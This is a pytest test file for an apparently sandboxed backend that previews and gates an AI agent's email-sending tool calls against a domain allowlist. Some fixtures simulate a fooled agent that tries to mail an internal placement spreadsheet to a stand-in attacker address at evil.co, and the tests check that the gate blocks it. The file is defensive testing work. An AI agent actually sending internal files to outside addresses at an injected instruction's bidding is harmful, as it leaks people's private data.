"""Email company workflow: draft -> preview (no side effects) -> send through the real gate path."""

import smtplib

import pytest
from fastapi.testclient import TestClient

from backend import agent, mailer
from backend.main import app

DOC = "clean/resume_02_rahul.txt"


@pytest.fixture
def client(tmp_path, monkeypatch):
    monkeypatch.setenv("DB_PATH", str(tmp_path / "test.db"))
    monkeypatch.setenv("AGENT", "fake")
    monkeypatch.setenv("AGENT_STEPS", "1")
    monkeypatch.delenv("GROQ_API_KEY", raising=False)
    monkeypatch.setenv("MAILPIT_SMTP_PORT", "1")  # nothing listens here: delivery falls back to the outbox record
    with TestClient(app) as c:
        c.headers.update({"Origin": "http://localhost:5173"})
        r = c.post("/api/auth/signup", json={"full_name": "Email Test", "email": "email-test@example.com",
                                             "password": "test-password-123"})
        c.headers.update({"X-CSRF-Token": r.json()["csrf_token"]})
        yield c


def _email(to: str, attachment: str | None = "sandbox/resumes/rahul_menon.txt") -> dict:
    args = {"to": to, "subject": "Candidate profile", "body": "Please find the resume attached."}
    if attachment:
        args["attachment"] = attachment
    return {"tool": "send_email", "args": args}


def _log_count(client) -> int:
    return len(client.get("/api/logs").json())


def test_draft_without_ai_uses_a_template_and_writes_no_log(client):
    before = _log_count(client)
    d = client.post("/api/email/draft", json={"doc": DOC, "to": "hr@partner-company.com", "note": "SDE intern"}).json()
    assert d["agent_mode"] == "fallback"
    call = d["calls"][0]
    assert call["tool"] == "send_email" and call["args"]["to"] == "hr@partner-company.com"
    assert call["args"]["attachment"] == DOC and "SDE intern" in call["args"]["body"]
    assert d["previews"][0]["verdict"] in ("ALLOW", "BLOCK", "REVIEW")
    assert _log_count(client) == before  # drafting is not an attempt


def test_draft_shows_a_fooled_agent_as_is(client, monkeypatch):
    fooled = [{"tool": "send_email", "args": {"to": "x@evil.co", "subject": "s", "body": "b",
                                               "attachment": "sandbox/placement_list.xlsx"}, "_id": "1"}]
    monkeypatch.setattr(agent, "_propose_live", lambda *a, **k: fooled)
    d = client.post("/api/email/draft", json={"doc": DOC, "to": "hr@partner-company.com"}).json()
    assert d["agent_mode"] == "live" and d["calls"][0]["args"]["to"] == "x@evil.co"
    assert d["previews"][0]["verdict"] == "BLOCK"


def test_check_previews_without_running_or_logging(client):
    before = _log_count(client)
    r = client.post("/api/check", json={"task": "email_company", "call": _email("hr@partner-company.com")}).json()
    assert r["verdict"] == "ALLOW"
    assert _log_count(client) == before
    assert client.get("/api/outbox").json() == []


@pytest.mark.parametrize(("to", "verdict"), [("hr@partner-company.com", "ALLOW"), ("friend@gmail.com", "REVIEW"),
                                             ("hr-verify@evil.co", "BLOCK")])
def test_send_goes_through_the_gate_and_is_logged(client, to, verdict):
    before = _log_count(client)
    body = client.post("/api/inject", json={"task": "email_company", "calls": [_email(to)]}).json()
    assert body["decisions"][0]["verdict"] == verdict
    assert _log_count(client) == before + 1
    assert (len(client.get("/api/outbox").json()) == 1) == (verdict == "ALLOW")


def test_allowed_send_falls_back_to_outbox_record_when_mailpit_is_down(client):
    body = client.post("/api/inject", json={"task": "email_company", "calls": [_email("hr@partner-company.com")]}).json()
    assert "Sandbox email record" in body["outputs"][0]


def test_mailer_attaches_the_file_and_only_talks_to_localhost(monkeypatch, tmp_path):
    sent = {}

    class FakeSMTP:
        def __init__(self, host, port, timeout):
            sent["host"] = host

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

        def send_message(self, msg):
            sent["msg"] = msg

    monkeypatch.setattr(smtplib, "SMTP", FakeSMTP)
    resume = tmp_path / "cv.txt"
    resume.write_text("Fake Candidate")
    mailer.send("hr@partner-company.com", "Profile", "Hello", resume)
    assert sent["host"] == "localhost"
    assert sent["msg"]["To"] == "hr@partner-company.com"
    assert [p.get_filename() for p in sent["msg"].iter_attachments()] == ["cv.txt"]

    monkeypatch.setenv("MAILPIT_HOST", "smtp.gmail.com")
    with pytest.raises(PermissionError):
        mailer.send("a@b.com", "s", "b")


def test_allowlist_add_remove_is_logged_and_per_workspace(client):
    call = _email("hr@newco.com", attachment=None)
    assert client.post("/api/check", json={"task": "email_company", "call": call}).json()["verdict"] == "BLOCK"

    assert client.post("/api/allowlist", json={"domain": "newco.com", "kind": "allow"}).status_code == 200
    assert client.post("/api/check", json={"task": "email_company", "call": call}).json()["verdict"] == "ALLOW"
    assert any(row["tool"] == "policy_change" for row in client.get("/api/logs").json())
    assert client.get("/api/logs/verify").json()["ok"] is True

    assert client.delete("/api/allowlist/newco.com").status_code == 200
    assert client.post("/api/check", json={"task": "email_company", "call": call}).json()["verdict"] == "BLOCK"
    assert client.post("/api/allowlist", json={"domain": "bad domain!", "kind": "allow"}).status_code == 422


def test_uploaded_resume_can_be_attached(client):
    up = client.post("/api/uploads", files={"file": ("cv.txt", b"Fake Candidate\nSkills: Python", "text/plain")}).json()
    body = client.post("/api/inject", json={"task": "email_company",
                                            "calls": [_email("hr@partner-company.com", attachment=up["path"])]}).json()
    assert body["decisions"][0]["verdict"] == "ALLOW"
